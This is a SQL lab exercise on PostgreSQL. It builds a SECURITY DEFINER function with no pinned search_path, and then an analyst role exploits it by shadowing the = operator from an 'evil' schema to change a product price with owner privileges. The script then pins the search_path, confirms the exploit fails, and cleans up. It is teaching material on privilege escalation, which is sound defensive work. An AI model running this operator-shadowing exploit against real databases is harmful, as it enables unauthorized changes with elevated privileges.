-- Exercise 13: exploit and fix a search_path hole in a SECURITY DEFINER function.
-- Run the sections in order, as the roles noted. Assumes small15.sh --with-1501.

-- === setup: the vulnerable function (as bazaar_owner) ===
SET ROLE bazaar_owner;
CREATE FUNCTION bazaar.seller_revenue(p_seller_id bigint) RETURNS numeric
LANGUAGE plpgsql SECURITY DEFINER AS $$
DECLARE v_total numeric;
BEGIN
    SELECT coalesce(sum(total), 0) INTO v_total FROM orders
    WHERE seller_id = p_seller_id AND status IN ('paid', 'shipped', 'delivered');
    RETURN v_total;
END $$;
RESET ROLE;

-- === exploit (as bazaar_analyst): a shadowing OPERATOR = ===
SET ROLE bazaar_analyst;
CREATE SCHEMA IF NOT EXISTS evil;
CREATE FUNCTION evil.int8eq_evil(bigint, bigint) RETURNS boolean
LANGUAGE plpgsql AS $$
BEGIN
    UPDATE bazaar.products SET price = 0.01 WHERE id = 3;  -- runs as bazaar_owner!
    RETURN $1 OPERATOR(pg_catalog.=) $2;
END $$;
CREATE OPERATOR evil.= (LEFTARG = bigint, RIGHTARG = bigint, FUNCTION = evil.int8eq_evil);
GRANT USAGE ON SCHEMA evil TO PUBLIC;
SET search_path = evil, pg_catalog, bazaar;
SELECT bazaar.seller_revenue(1);                 -- looks normal
SELECT price FROM bazaar.products WHERE id = 3;  -- 0.01: the analyst changed a price it cannot UPDATE
RESET ROLE;

-- === fix (as superuser/owner): pin the search_path, restore the data ===
UPDATE bazaar.products SET price = 2199.99 WHERE id = 3;
ALTER FUNCTION bazaar.seller_revenue(bigint) SET search_path = pg_catalog, bazaar, pg_temp;

-- === verify the exploit is dead (as bazaar_analyst) ===
SET ROLE bazaar_analyst;
SET search_path = evil, pg_catalog, bazaar;
SELECT bazaar.seller_revenue(1);                 -- correct revenue, resolved via pg_catalog.=
SELECT price FROM bazaar.products WHERE id = 3;  -- 2199.99: untouched
RESET ROLE;

-- === cleanup ===
DROP SCHEMA evil CASCADE;
DROP FUNCTION bazaar.seller_revenue(bigint);
